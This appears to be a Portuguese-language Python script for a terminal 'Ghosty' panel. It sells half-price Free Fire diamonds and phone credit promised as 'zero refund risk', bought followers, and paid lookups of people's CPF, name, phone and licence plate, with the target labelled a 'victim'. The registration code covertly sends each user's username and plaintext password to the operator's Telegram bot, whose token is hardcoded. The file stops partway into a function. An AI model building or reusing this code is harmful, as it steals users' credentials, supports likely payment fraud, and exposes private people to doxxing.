import time
import requests
import stdiomask
from os import system
from termcolor import colored as cor

token = '6637790451:AAHEz1iKdaxZv_EDigrQjwmiVO-pGVitHJM'
id_message = '5928476742'

def digitar_com_efeito(texto):
    for char in texto:
        print("~Ghosty👻: " + texto[:texto.index(char) + 1], end='\r')
        time.sleep(0.05)  # Ajuste este valor para controlar a velocidade de digitação
    print("~Ghosty👻: " + texto)  # Certifique-se de imprimir o texto completo no final


def buscar(NovoUsuario, NovaSenha):
    usuarios = []
    try:
        with open('usuarios.txt', 'r+', encoding='Utf-8', newline='') as verif:
            for linha in verif:
                linha = linha.strip(",")
                usuarios.append(linha.split())

            for usuario in usuarios:
                name = usuario[0]
                password = usuario[1]
                if NovoUsuario == name and NovaSenha == password:
                    return True
    except FileNotFoundError:
        return False            

def registro():
    global token
    global id_message
    system('clear')
    print(cor('~Ghosty👻: Painel de registro', 'blue'))
    NovoUsuario = input('Digite seu usuario: ')
    NovaSenha = stdiomask.getpass(prompt='Digite sua senha: ', mask='*')
    user = buscar(NovoUsuario, NovaSenha)

    
    if NovoUsuario == NovaSenha:
        print(cor('~Ghosty👻: Seu usuario deve ser diferente da senha', 'red'))
        time.sleep(2)
        registro()

    if user == True:
        system('clear')
        print(cor('~Ghosty👻: Esse usuario ja existe!', 'red'))
        time.sleep(3)
        exit()

    else:
        with open('usuarios.txt', 'a+', encoding='Utf-8', newline='') as arquivo:
            arquivo.writelines(f'{NovoUsuario} {NovaSenha}\n')
            print(cor('~Ghosty👻: Cadastro aprovado!', 'green'))
            mensagem = f'''NOVO USUARIO CADASTRADO :)
USER: {NovoUsuario}
SENHA: {NovaSenha}'''
            url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id_message}&text={mensagem}'
            requests.get(url)
            exit()

def menu():
    system('clear')
    print(cor('''
===================================================
                     10101010
                 1010101110100101
               10101010101101010101
            011010101010110110010100101
           101      11010101      101010
           0          0101          10101
           0####      1010####      01101
         101####      0101####      1010101
         101####      1010####      1101010
         10101      10101011      101010101
         0111011010101010110110101010110101
         0101010101010101010101010101010110
         0101101101010101101010101010101101
         0101010101010100101010101010101101
         0010101011010110101010111010110101
         0110101011010110101011010101010101
         0101     10101      10101     1010
         101       0101      0101       010
=====================================================
~Ghosty👻: Olá, Sou o Ghosty, seu assistente pessoal!
~Ghosty👻: Escolha uma opção a baixo
=====================================================
[1]Cadastrar
[2]Fazer Login
[3]Fechar
[4]Redes Sociais
[99]Atualizar Painel
    ''', 'blue'))
    opcoes = input('DIGITE A OPCAO DESEJADA: ')
    if opcoes == '1':
        registro()

    elif opcoes == '2':  
        login()

    elif opcoes == '3':
        fechar()    

    elif opcoes == '4':
        redes_sociais()

    elif opcoes == '99':
        atualizar()

    else:
        system('clear')
        print(cor('~Ghosty👻: OPCAO INCORRETA! por favor, digite somente a opcao: 1, 2 ou 3', 'red'))
        time.sleep(4)
        menu()

def painel_consultas():
    system('clear')
    print('     PAINEL DE CONSULTAS')
    print("~Ghosty👻: Esse é o painel de consultas.")
    print(cor('''[10] Consulta IP (GRATIS)
[20] Consulta Cep (GRATIS)
[30] Consulta Cnpj (GRATIS)
[40] Consulta Cpf Completa (𝗥$𝟭,𝟬𝟬 CADA CONSUL // 10 por R$7,00)
[50] Consulta Nome (𝗥$𝟬,𝟱𝟬 CADA CONSUL)
[60] Consulta Telefone (𝗥$𝟬,𝟱𝟬 CADA CONSUL)
[70] Consulta Placa (𝗥$𝟬,𝟱𝟬 CADA CONSUL)
[95] Redes Sociais
[99] Voltar''', 'blue'))
    o = input('~Ghosty👻: DIGITE A OPCAO: ')
    if o == '10':
        puxar_ip()

    if o == '20':
        puxar_cep()

    if o == '30':
        puxar_cnpj()

    if o == '40':
        puxar_cpf()

    if o == '50':
        puxar_nome()

    if o == '60':
        buscar_telefone()
        
    if o == '70':
        buscar_placa()
    
    if o == '95':
        redes_sociaisCONS()

    if o == '99':
        menu_vendas()
    else:
        print(cor('~Ghosty👻: OPCAO INVALIDA!!!!', 'red'))
        time.sleep(4)
        painel_consultas()
        
def login():
    system('clear')
    NovoUsuario = input('~Ghosty👻: DIGITE SEU USUARIO: ')
    NovaSenha = stdiomask.getpass(prompt='Senha: ', mask='*')
    user = buscar(NovoUsuario, NovaSenha)
    if user == True:
        print(cor('''~Ghosty👻: SENHA CONFIRMADA!
INICIANDO SCRIPT...''', 'green'))    
        time.sleep(1)
        menu_vendas()

    else:
        system("clear")
        print(cor('~Ghosty👻: Usuario nao cadastrado, registre-se', 'red'))
        time.sleep(2)
        registro()

def fechar():
    system('clear')
    print(cor('''~Ghosty👻: Se vc iniciou o programa
usando "sh start.sh ou sh install.sh" vc deve fecha-lo manualmente clicando no botao CTRL e na letra C e dando ENTER
''', 'yellow'))
    print(cor('''~Ghosty👻: SE VOCE INICIOU USANDO "python main.py"
apenas digite 1 e de ENTER''', 'green'))
    opc = input(': ')
    if opc == '1':
        system('clear')
        print('~Ghosty👻: Fecharemos em 3 segundos...')
        time.sleep(3)
        system('clear')
        print(cor('~Ghosty👻: Ate logo... :)', 'green'))
        exit()
    else:
        system('clear')
        print(cor('~Ghosty👻: OPCAO INVALIDA!!!', 'red'))
        time.sleep(3)
        fechar()
        
def menu_vendas():
    system('clear')
    print(cor('''
====================================================
                     10101010
                 1010101110100101
               10101010101101010101
            011010101010110110010100101
           101      11010101      101010
           0          0101          10101
           0####      1010####      01101
         101####      0101####      1010101
         101####      1010####      1101010
         10101      10101011      101010101
         0111011010101010110110101010110101
         0101010101010101010101010101010110
         0101101101010101101010101010101101
         0101010101010100101010101010101101
         0010101011010110101010111010110101
         0110101011010110101011010101010101
         0101     10101      10101     1010
         101       0101      0101       010
====================================================

[0]Fechar Programa

[1]Menu Dimas FF (metade do preco)

[2]Menu Seguidores (R$2,00 cada 1000)

[3]Recarga Vivo (Credito pela metade do valor)

[4]Painel Consultas GOLD V1.0.0(beta)

[5]Dar Sugestao

[10]Redes Sociais
''', 'blue'))
    escolha = input('~Ghosty👻: Digite a opcao desejada: ')
    if escolha == '0':
        fechar()
    
    if escolha == '1':
        menu_dimas()

    if escolha == '2':
        menu_seg()

    if escolha == '3':
        menu_recarga()

    if escolha == '4':
        painel_consultas()

    if escolha == '5':
        dar_sugestao()

    if escolha == '10':
        redes_sociaisPAINEL()

    else:
        print(cor('~Ghosty👻: Opcao invalida escolha apenas 1, 2 ou 3', 'red'))
        time.sleep(3)
        menu_vendas()

def ver_valor(escolha):
    if escolha == '1':
        return 'R$8,00'
    if escolha == '2':
        return 'R$15,00'
    if escolha == '3':
        return 'R$30,00'
    if escolha == '4':
        return 'R$50,00'
    if escolha == '5':
        return 'R$90,00'
    if escolha == '6':
        return 'R$155,00'
    if escolha == '7':
        return 'R$300,00'
    if escolha == '8':
        return 'R$840,00'
    if escolha == '9':
        return 'R$1500,00'
        
def enviar_mensagem(pegarnome, pegarid, pegarnumero, quantidade, valor):
    global token
    global id_message
    mensagem = f'''~Ghosty👻: Salveeeeeeeeeeeee
    Acabaram de efetuar uma compra de Diamantes
NOME = {pegarnome}
ID FREE FIRE = {pegarid}
NUMERO = {pegarnumero}
PEDIDO = {quantidade} DIMAS FREE FIRE
TOTAL PAGO = {valor}

NOIS CHEFE, OTIMO DIAAAAAA'''
    url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id_message}&text={mensagem}'
    requests.get(url)
    print(cor('~Ghosty👻: SEU PEDIDO FOI ADICIONADO A FILA, SE TUDO OCORRER BEM VOCE SERA AVISADO NO WHATSAPP', 'green'))
    time.sleep(4)
    menu_dimas()

def menu_dimas():
    system('clear')
    system('clear')
    print(cor('''~Ghosty👻: 𝑴𝑬𝑵𝑼 𝑫𝑰𝑨𝑴𝑨𝑵𝑻𝑬𝑺''', 'green'))
    print(cor('''
[ 0 ] Voltar
[ 1 ]  Ⓥ Recarga de 335 Dimas = paga R$8,00   
[ 2 ]  Ⓥ Recarga de 660 Dimas = paga R$15,00   
[ 3 ]  Ⓥ Recarga de 1650 Dimas = paga R$30,00   
[ 4 ]  Ⓥ Recarga de 2450 Dimas = paga R$50,00 
[ 5 ]  Ⓥ Recarga de 5300 Dimas = paga R$90,00
[ 6 ]  Ⓥ Recarga de 10,600 Dimas = paga R$155,00   
[ 7 ]  Ⓥ Recarga de 21,200 Dimas = paga R$300,00   
[ 8 ]  Ⓥ Recarga de 53,000 Dimas = paga R$840,00   
[ 9 ]  Ⓥ Recarga de 100,700 Dimas = paga R$1500,00   

0 risco de reembolso!
Metodo testado e comprovado sem reembolso !
''', 'blue'))
    escolha = input(cor('~Ghosty👻: DIGITE A OPCAO DESEJADA: ', 'green'))
    if escolha == '0':
        menu_vendas()

    if escolha == '1':
        system('clear')
        pegarid = input('DIGITE SEU ID: ')
        system('clear')
        print(cor('''~Ghosty👻: O NOME DIGITADO DEVE SER IGUAL AO DA CONTA QUE IRA PAGAR
PARA QUE POSSAMOS IDENTIFICAR O PAGAMENTO''', 'red'))
        pegarnome = input('''~Ghosty👻: DIGITE O NOME: ''')
        system('clear')
        print(cor('~Ghosty👻: DIGITE SEU NUMERO DE CONTATO, (ISSO AJUDA CASO ALGO DE ERRADO)', 'blue'))
        pegarnumero = input('SEU NUMERO: ')
        quantidade = '335'
        valor = ver_valor(escolha)
        system('clear')
        print(cor(f'''~Ghosty👻: DADOS DO CLIENTE
PRODUTO: {quantidade} DIMAS FREE FIRE
ID: {pegarid}
NOME: {pegarnome}
NUMERO: {pegarnumero}
VALOR: {valor}''', 'yellow'))
        time.sleep(6)
        print(cor('''
SE OS DADOS ESTIVEREM CORRETO DIGITE 1
SE ESTIVER ERRADO DIGITE 2''', 'blue'))
        verificar_dados = input('DIGITE A OPCAO: ')
        if verificar_dados == '1':
            system('clear')
            print(cor('~Ghosty👻: Pague utilizando pix, DADOS ABAIXO: ', 'green'))
            print(f'''
VALOR = {valor}
CHAVE PIX EMAIL = ghostvoltz29@gmail.com''')
            
            confirmarpag = input('~Ghosty👻: Se ja pagou digite 1: ')
            if confirmarpag == '1':
                system('clear')
                enviar_mensagem(pegarnome, pegarid, pegarnumero, quantidade, valor)
            
            else:
                print('~Ghosty👻: Digite somente a opcao 1')

        if verificar_dados == '2':
            menu_dimas()
        
        else:
            print(cor('~Ghosty👻: SOMENTE OPCAO 1 E 2', 'red'))
            time.sleep(4)
            menu_dimas()

    if escolha == '2':
        system('clear')
        pegarid = input('~Ghosty👻: DIGITE SEU ID: ')
        system('clear')
        print(cor('''~Ghosty👻: O NOME DIGITADO DEVE SER IGUAL AO DA CONTA QUE IRA PAGAR
PARA QUE EU POSSA IDENTIFICAR O PAGAMENTO''', 'red'))
        pegarnome = input('''~Ghosty👻: DIGITE O NOME: ''')
        system('clear')
        print(cor('~Ghosty👻: DIGITE SEU NUMERO DE CONTATO, (ISSO AJUDA CASO ALGO DE ERRADO)', 'blue'))
        pegarnumero = input('~Ghosty👻: SEU NUMERO: ')
        quantidade = '660'
        valor = ver_valor(escolha)
        system('clear')
        print(cor(f'''~Ghosty👻: DADOS DO CLIENTE
PRODUTO: {quantidade} DIMAS FREE FIRE
ID: {pegarid}
NOME: {pegarnome}
NUMERO: {pegarnumero}
VALOR: {valor}''', 'yellow'))
        time.sleep(10)
        print(cor('''
~Ghosty👻:
SE OS DADOS ESTIVEREM CORRETO DIGITE 1
SE ESTIVER ERRADO DIGITE 2''', 'blue'))
        verificar_dados = input('~Ghosty👻: DIGITE A OPCAO: ')
        if verificar_dados == '1':
            system('clear')
            print(cor('~Ghosty👻: Pague utilizando pix, DADOS ABAIXO: ', 'green'))
            print(f'''
~Ghosty👻:
VALOR = {valor}
CHAVE PIX: EMAIL = ghostvoltz29@gmail.com''')
            
            confirmarpag = input('~Ghosty👻: Se ja pagou digite 1: ')
            if confirmarpag == '1':
                system('clear')
                enviar_mensagem(pegarnome, pegarid, pegarnumero, quantidade, valor)
                
            else:
                print('~Ghosty👻: Digite somente a opcao 1')

        if verificar_dados == '2':
            menu_dimas()

        else:
            print(cor('~Ghosty👻: SOMENTE OPCAO 1 E 2', 'red'))
            time.sleep(4)
            menu_dimas()

    if escolha == '3':
        system('clear')
        pegarid = input('~Ghosty👻: DIGITE SEU ID: ')
        system('clear')
        print(cor('''~Ghosty👻: O NOME DIGITADO DEVE SER IGUAL AO DA CONTA QUE IRA PAGAR
PARA QUE POSSAMOS IDENTIFICAR O PAGAMENTO''', 'red'))
        pegarnome = input('''~Ghosty👻: DIGITE O NOME: ''')
        system('clear')
        print(cor('~Ghosty👻: DIGITE SEU NUMERO DE CONTATO, (ISSO AJUDA CASO ALGO DE ERRADO)', 'blue'))
        pegarnumero = input('~Ghosty👻: SEU NUMERO: ')
        quantidade = '1650'
        valor = ver_valor(escolha)
        system('clear')
        print(cor(f'''~Ghosty👻: DADOS DO CLIENTE
PRODUTO: {quantidade} DIMAS FREE FIRE
ID: {pegarid}
NOME: {pegarnome}
NUMERO: {pegarnumero}
VALOR: {valor}''', 'yellow'))
        time.sleep(10)
        print(cor('''
~Ghosty👻:
SE OS DADOS ESTIVEREM CORRETO DIGITE 1
SE ESTIVER ERRADO DIGITE 2''', 'blue'))
        verificar_dados = input('~Ghosty👻: DIGITE A OPCAO: ')
        if verificar_dados == '1':
            system('clear')
            print(cor('~Ghosty👻: Pague utilizando pix, DADOS ABAIXO: ', 'green'))
            print(f'''~Ghosty👻:
VALOR = {valor}
CHAVE ALEATORIA = ghostvoltz29@gmail.com''')
            
            confirmarpag = input('~Ghosty👻: Se ja pagou digite 1: ')
            if confirmarpag == '1':
                system('clear')
                enviar_mensagem(pegarnome, pegarid, pegarnumero, quantidade, valor)

            else:
                print('~Ghosty👻: Digite somente a opcao 1')

        if verificar_dados == '2':
            menu_dimas()
        

        else:
            print(cor('~Ghosty👻: SOMENTE OPCAO 1 E 2', 'red'))
            time.sleep(4)
            menu_dimas()
                
    if escolha == '4':
        system('clear')
        pegarid = input('~Ghosty👻: DIGITE SEU ID: ')
        system('clear')
        print(cor('''~Ghosty👻: O NOME DIGITADO DEVE SER IGUAL AO DA CONTA QUE IRA PAGAR
PARA QUE POSSAMOS IDENTIFICAR O PAGAMENTO''', 'red'))
        pegarnome = input('''~Ghosty👻: DIGITE O NOME: ''')
        system('clear')
        print(cor('~Ghosty👻: DIGITE SEU NUMERO DE CONTATO, (ISSO AJUDA CASO ALGO DE ERRADO)', 'blue'))
        pegarnumero = input('~Ghosty👻: SEU NUMERO: ')
        quantidade = '2450'
        valor = ver_valor(escolha)
        system('clear')
        print(cor(f'''~Ghosty👻: DADOS DO CLIENTE
PRODUTO: {quantidade} DIMAS FREE FIRE
ID: {pegarid}
NOME: {pegarnome}
NUMERO: {pegarnumero}
VALOR: {valor}''', 'yellow'))
        time.sleep(10)
        print(cor('''
~Ghosty👻:
SE OS DADOS ESTIVEREM CORRETO DIGITE 1
SE ESTIVER ERRADO DIGITE 2''', 'blue'))
        verificar_dados = input('~Ghosty👻: DIGITE A OPCAO: ')
        if verificar_dados == '1':
            system('clear')
            print(cor('~Ghosty👻: Pague utilizando pix, DADOS ABAIXO: ', 'green'))
            print(f'''~Ghosty👻:
VALOR = {valor}
CHAVE PIX: EMAIL = ghostvoltz29@gmail.com''')
            
            confirmarpag = input('~Ghosty👻: Se ja pagou digite 1: ')
            if confirmarpag == '1':
                system('clear')
                enviar_mensagem(pegarnome, pegarid, pegarnumero, quantidade, valor)
            
            else:
                print('~Ghosty👻: Digite somente a opcao 1')

        if verificar_dados == '2':
            menu_dimas()
        

        else:
            print(cor('~Ghosty👻: SOMENTE OPCAO 1 E 2', 'red'))
            time.sleep(4)
            menu_dimas()

    if escolha == '5':
        system('clear')
        pegarid = input('~Ghosty👻: DIGITE SEU ID: ')
        system('clear')
        print(cor('''~Ghosty👻: O NOME DIGITADO DEVE SER IGUAL AO DA CONTA QUE IRA PAGAR
PARA QUE POSSAMOS IDENTIFICAR O PAGAMENTO''', 'red'))
        pegarnome = input('''~Ghosty👻: DIGITE O NOME: ''')
        system('clear')
        print(cor('~Ghosty👻: DIGITE SEU NUMERO DE CONTATO, (ISSO AJUDA CASO ALGO DE ERRADO)', 'blue'))
        pegarnumero = input('~Ghosty👻: SEU NUMERO: ')
        quantidade = '5300'
        valor = ver_valor(escolha)
        system('clear')
        print(cor(f'''
~Ghosty👻: 
DADOS DO CLIENTE
PRODUTO: {quantidade} DIMAS FREE FIRE
ID: {pegarid}
NOME: {pegarnome}
NUMERO: {pegarnumero}
VALOR: {valor}''', 'yellow'))
        time.sleep(10)
        print(cor('''
~Ghosty👻:
SE OS DADOS ESTIVEREM CORRETO DIGITE 1
SE ESTIVER ERRADO DIGITE 2''', 'blue'))
        verificar_dados = input('~Ghosty👻: DIGITE A OPCAO: ')
        if verificar_dados == '1':
            system('clear')
            print(cor('~Ghosty👻: Pague utilizando pix, DADOS ABAIXO: ', 'green'))
            print(f'''
~Ghosty👻:
VALOR = {valor}
CHAVE PIX: EMAIL = ghostvoltz29@gmail.com''')
            
            confirmarpag = input('~Ghosty👻: Se ja pagou digite 1: ')
            if confirmarpag == '1':
                system('clear')
                enviar_mensagem(pegarnome, pegarid, pegarnumero, quantidade, valor)
            
            else:
                print('~Ghosty👻: Digite somente a opcao 1')

        if verificar_dados == '2':
            menu_dimas()
        

        else:
            print(cor('~Ghosty👻: SOMENTE OPCAO 1 E 2', 'red'))
            time.sleep(4)
            menu_dimas()

    if escolha == '6':
        system('clear')
        pegarid = input('~Ghosty👻: DIGITE SEU ID: ')
        system('clear')
        print(cor('''~Ghosty👻: O NOME DIGITADO DEVE SER IGUAL AO DA CONTA QUE IRA PAGAR
PARA QUE POSSAMOS IDENTIFICAR O PAGAMENTO''', 'red'))
        pegarnome = input('''~Ghosty👻: DIGITE O NOME: ''')
        system('clear')
        print(cor('~Ghosty👻: DIGITE SEU NUMERO DE CONTATO, (ISSO AJUDA CASO ALGO DE ERRADO)', 'blue'))
        pegarnumero = input('~Ghosty👻: SEU NUMERO: ')
        quantidade = '10600'
        valor = ver_valor(escolha)
        system('clear')
        print(cor(f'''
~Ghosty👻:
DADOS DO CLIENTE
PRODUTO: {quantidade} DIMAS FREE FIRE
ID: {pegarid}
NOME: {pegarnome}
NUMERO: {pegarnumero}
VALOR: {valor}''', 'yellow'))
        time.sleep(10)
        print(cor('''
~Ghosty👻: SE OS DADOS ESTIVEREM CORRETO DIGITE 1
SE ESTIVER ERRADO DIGITE 2''', 'blue'))
        verificar_dados = input('~Ghosty👻: DIGITE A OPCAO: ')
        if verificar_dados == '1':
            system('clear')
            print(cor('~Ghosty👻: Pague utilizando pix, DADOS ABAIXO: ', 'green'))
            print(f'''
~Ghosty👻:
VALOR = {valor}
CHAVE PIX: EMAIL = ghostvoltz29@gmail.com''')
            
            confirmarpag = input('~Ghosty👻: Se ja pagou digite 1: ')
            if confirmarpag == '1':
                system('clear')
                enviar_mensagem(pegarnome, pegarid, pegarnumero, quantidade, valor)
                
            else:
                print('~Ghosty👻: Digite somente a opcao 1')

        if verificar_dados == '2':
            menu_dimas()
        

        else:
            print(cor('~Ghosty👻: SOMENTE OPCAO 1 E 2', 'red'))
            time.sleep(4)
            menu_dimas()

    if escolha == '7':
        system('clear')
        pegarid = input('~Ghosty👻: DIGITE SEU ID: ')
        system('clear')
        print(cor('''~Ghosty👻: O NOME DIGITADO DEVE SER IGUAL AO DA CONTA QUE IRA PAGAR
PARA QUE POSSAMOS IDENTIFICAR O PAGAMENTO''', 'red'))
        pegarnome = input('''~Ghosty👻: DIGITE O NOME: ''')
        system('clear')
        print(cor('~Ghosty👻: DIGITE SEU NUMERO DE CONTATO, (ISSO AJUDA CASO ALGO DE ERRADO)', 'blue'))
        pegarnumero = input('~Ghosty👻: SEU NUMERO: ')
        quantidade = '21200'
        valor = ver_valor(escolha)
        system('clear')
        print(cor(f'''~Ghosty👻: DADOS DO CLIENTE
PRODUTO: {quantidade} DIMAS FREE FIRE
ID: {pegarid}
NOME: {pegarnome}
NUMERO: {pegarnumero}
VALOR: {valor}''', 'yellow'))
        time.sleep(10)
        print(cor('''
~Ghosty👻:
SE OS DADOS ESTIVEREM CORRETO DIGITE 1
SE ESTIVER ERRADO DIGITE 2''', 'blue'))
        verificar_dados = input('~Ghosty👻: DIGITE A OPCAO: ')
        if verificar_dados == '1':
            system('clear')
            print(cor('~Ghosty👻: Pague utilizando pix, DADOS ABAIXO: ', 'green'))
            print(f'''
~Ghosty👻:
VALOR = {valor}
CHAVE PIX: EMAIL = ghostvoltz29@gmail.com''')
            
            confirmarpag = input('~Ghosty👻: Se ja pagou digite 1: ')
            if confirmarpag == '1':
                system('clear')
                enviar_mensagem(pegarnome, pegarid, pegarnumero, quantidade, valor)
            
            else:
                print('~Ghosty👻: Digite somente a opcao 1')

        if verificar_dados == '2':
            menu_dimas()
        
        else:
            print(cor('~Ghosty👻: SOMENTE OPCAO 1 E 2', 'red'))
            time.sleep(4)
            menu_dimas()
                
    if escolha == '8':
        system('clear')
        pegarid = input('~Ghosty👻: DIGITE SEU ID: ')
        system('clear')
        print(cor('''~Ghosty👻: O NOME DIGITADO DEVE SER IGUAL AO DA CONTA QUE IRA PAGAR
PARA QUE POSSAMOS IDENTIFICAR O PAGAMENTO''', 'red'))
        pegarnome = input('''~Ghosty👻: DIGITE O NOME: ''')
        system('clear')
        print(cor('~Ghosty👻: DIGITE SEU NUMERO DE CONTATO, (ISSO AJUDA CASO ALGO DE ERRADO)', 'blue'))
        pegarnumero = input('~Ghosty👻: SEU NUMERO: ')
        quantidade = '53000'
        valor = ver_valor(escolha)
        system('clear')
        print(cor(f'''~Ghosty👻: DADOS DO CLIENTE
PRODUTO: {quantidade} DIMAS FREE FIRE
ID: {pegarid}
NOME: {pegarnome}
NUMERO: {pegarnumero}
VALOR: {valor}''', 'yellow'))
        time.sleep(10)
        print(cor('''~Ghosty👻:
SE OS DADOS ESTIVEREM CORRETO DIGITE 1
SE ESTIVER ERRADO DIGITE 2''', 'blue'))
        verificar_dados = input('~Ghosty👻: DIGITE A OPCAO: ')
        if verificar_dados == '1':
            system('clear')
            print(cor('~Ghosty👻: Pague utilizando pix, DADOS ABAIXO: ', 'green'))
            print(f'''~Ghosty👻:
VALOR = {valor}
CHAVE PIX: EMAIL = ghostvoltz29@gmail.com''')
            
            confirmarpag = input('~Ghosty👻: Se ja pagou digite 1: ')
            if confirmarpag == '1':
                system('clear')
                enviar_mensagem(pegarnome, pegarid, pegarnumero, quantidade, valor)
            
            else:
                print('~Ghosty👻: Digite somente a opcao 1')

        if verificar_dados == '2':
            menu_dimas()
        

        else:
            print(cor('~Ghosty👻: SOMENTE OPCAO 1 E 2', 'red'))
            time.sleep(4)
            menu_dimas()
                
    if escolha == '9':
        system('clear')
        pegarid = input('~Ghosty👻: DIGITE SEU ID: ')
        system('clear')
        print(cor('''~Ghosty👻: O NOME DIGITADO DEVE SER IGUAL AO DA CONTA QUE IRA PAGAR
PARA QUE POSSAMOS IDENTIFICAR O PAGAMENTO''', 'red'))
        pegarnome = input('''~Ghosty👻: DIGITE O NOME: ''')
        system('clear')
        print(cor('~Ghosty👻: DIGITE SEU NUMERO DE CONTATO, (ISSO AJUDA CASO ALGO DE ERRADO)', 'blue'))
        pegarnumero = input('~Ghosty👻: SEU NUMERO: ')
        quantidade = '100700'
        valor = ver_valor(escolha)
        system('clear')
        print(cor(f'''~Ghosty👻: DADOS DO CLIENTE
PRODUTO: {quantidade} DIMAS FREE FIRE
ID: {pegarid}
NOME: {pegarnome}
NUMERO: {pegarnumero}
VALOR: {valor}''', 'yellow'))
        time.sleep(10)
        print(cor('''~Ghosty👻:
SE OS DADOS ESTIVEREM CORRETO DIGITE 1
SE ESTIVER ERRADO DIGITE 2''', 'blue'))
        verificar_dados = input('~Ghosty👻: DIGITE A OPCAO: ')
        if verificar_dados == '1':
            system('clear')
            print(cor('~Ghosty👻: Pague utilizando pix, DADOS ABAIXO: ', 'green'))
            print(f'''~Ghosty👻:
VALOR = R${valor}
CHAVE PIX: EMAIL = ghostvoltz29@gmail.com''')
            
            confirmarpag = input('~Ghosty👻: Se ja pagou digite 1: ')
            if confirmarpag == '1':
                system('clear')
                enviar_mensagem(pegarnome, pegarid, pegarnumero, quantidade, valor)
            
            else:
                print('~Ghosty👻: Digite somente a opcao 1')

        if verificar_dados == '2':
            menu_dimas()
        

        else:
            print(cor('~Ghosty👻: SOMENTE OPCAO 1 E 2', 'red'))
            time.sleep(4)
            menu_dimas()

    else:
        system('clear')
        print(cor('~Ghosty👻: DIGITE SOMENTE UMA OPCAO DE 0 A 9 !!!!!!', 'red'))
        time.sleep(4)
          
def gerarpix(valor, tipoconsul, nome, contato, vitima):
    global id_message
    global token
    valor = valor
    url = requests.get(f'https://gerarqrcodepix.com.br/api/v1?nome=GhostVoltz&cidade=Fantasma&valor={valor}&saida=br&chave=ghostvoltz29@gmail.com').json()
    system('clear')
    print('~Ghosty👻: CODIGO COPIA E COLA GERADO :)')
    print(cor(f"~Ghosty👻: {url['brcode']}", 'green'))
    print('''~Ghosty👻:
    Após pagar digite 1''')
    g = input(': ')
    if g == '1':
        mensagem = f'''~Ghosty👻: Fala Chefe Nova Consulta PENDENTE
            CONSULTA DE {tipoconsul}
PAGADOR: {nome}
CONTATO: {contato}
PUXAR: {vitima}
VALOR: {valor}
'''
        enviar = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id_message}&text={mensagem}'
        requests.get(enviar)
        system('clear')
        print(cor('~Ghosty👻: SEU PEDIDO FOI ADICIONADO A FILA, SE TUDO OCORRER BEM VOCE SERA AVISADO NO WHATSAPP', 'green'))
        time.sleep(5)
        return True
    
    else:
        system('clear')
        print(cor('~Ghosty👻: OPCAO INVALIDA!!!', 'red'))
        time.sleep(3)
        return
        
def menu_seg():
    system('clear')
    print(cor('''~Ghosty👻: 𝓜𝓔𝓝𝓤 𝓢𝓔𝓖𝓤𝓘𝓓𝓞𝓡𝓔𝓢   
1000 = R$2,10
2000 = R$4,20
3000 = R$6,00
4000 = R$8,00
5000 = R$10,00
6000 = R$12,00
7000 = R$14,00
8000 = R$16,00
9000 = R$18,00
10000(10K) = R$20,00
20000(20K) = R$40,00
50000(50K) = R$100,00
100000(100K) = R$190,00''', 'yellow'))
    escolha = input('''~Ghosty👻: SE QUISER COMPRAR DIGITE 1
    CASO NAO QUEIRA DIGITE 2

DIGITE A OPCAO:  ''')
    if escolha == '1':
        system('clear')
        while not (quantidade := input('~Ghosty👻: Digite quantos quer comprar: ')).isdigit() or (quantidade := int(quantidade)) < 500 or quantidade > 100000:
            print(cor("~Ghosty👻: VALOR INVALIDO, DIGITE UMA QUANTIDADE ENTRE 500 E 100K", 'red'))
            return
        quantidade = quantidade
        somar = quantidade * 0.0021
        if somar < 5.00:
            system('clear')
            print(cor(f'~Ghosty👻: SEU PEDIDO FOI R${somar} PEDIDO MINIMO É R$5,00', 'red'))
            time.sleep(5)
            menu_seg()
        else:
            pegarinsta = input('~Ghosty👻: DIGITE SEU @: ')
            print(cor('''~Ghosty👻: O NOME DIGITADO DEVE SER IGUAL AO DA CONTA QUE IRA PAGAR
PARA QUE POSSAMOS IDENTIFICAR O PAGADOR''', 'red'))
            pegarnome = input('''~Ghosty👻: DIGITE O NOME: ''')
            while not (pegarnumero := input('~Ghosty👻: DIGITE SEU WHATSAPP: ')).isdigit() or (pegarnumero := int(pegarnumero)) < 100000000000 and quantidade > 100000000000:
                print(cor("~Ghosty👻: O TELEFONE DEVE CONTER 11 DIGITOS INCLUINDO O DDD LOCAL!!! EXEMPLO: 14997128882", 'red'))
            pegarnumero = pegarnumero
            system('clear')
            print(cor('~Ghosty👻: DADOS CLIENTE', 'blue'))
            print(f'''~Ghosty👻: PRODUTO: {quantidade} SEGUIDORES
VALOR: R${somar}
PERFIL: {pegarinsta}
NOME: {pegarnome}
NUMERO: {pegarnumero}''')
            time.sleep(2)
            print(cor('''~Ghosty👻:
SE OS DADOS ESTIVEREM CORRETO DIGITE 1
SE ESTIVER ERRADO DIGITE 2''', 'blue'))
            verificar_dados = input('~Ghosty👻: DIGITE A OPCAO: ')
            if verificar_dados == '1':
                system('clear')
                print(cor('~Ghosty👻: Pague utilizando pix, DADOS ABAIXO: ', 'green'))
                print(cor(f'''~Ghosty👻:
VALOR = R${somar}
(SE O VALOR ESTIVER QUEBRADO, ARREDONDE NO PAGAMENTO)
CHAVE PIX: EMAIL = ghostvoltz29@gmail.com''', 'green'))
                
                confirmarpag = input('~Ghosty👻: Se ja pagou digite 1: ')
                if confirmarpag == '1':
                    message = f'''~Ghosty👻: Salveeeeeeeeeeeee
Acabaram de efetuar uma compra de seguidores
NOME = {pegarnome}
INSTAGRAM = {pegarinsta}
NUMERO = {pegarnumero}
PEDIDO = {quantidade} SEGUIDORES
TOTAL PAGO = R${somar}

É NOIS CHEFE, ÓTIMO DIAAAAAA'''
                    url_base = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={id_message}&text={message}'
                    requests.get(url_base)
                    system('clear')
                    print(cor('~Ghosty👻: SEU PEDIDO FOI ADICIONADO A FILA, SE TUDO OCORRER BEM VOCE SERA AVISADO NO WHATSAPP', 'green'))
                    time.sleep(4)
                    menu_seg()
                    
                else:
                    print('~Ghosty👻: Digite somente a opcao 1')
                    
            if verificar_dados == '2':
                system('clear')
                print(cor('~Ghosty👻: Preencha Novamente', 'red'))
                time.sleep(3)
                menu_seg()

    if escolha == '2':
        system('clear')
        print(cor('~Ghosty👻: Retornando...', 'red'))
        time.sleep(2)
        menu_vendas()

    else:
        print(cor('''~Ghosty👻:
ESCOLHA SOMENTE A OPCAO 1 OU 2''', 'red'))
        time.sleep(3)
        menu_seg()

def buscar_placa():
    global id_message
    global token
    system('clear')
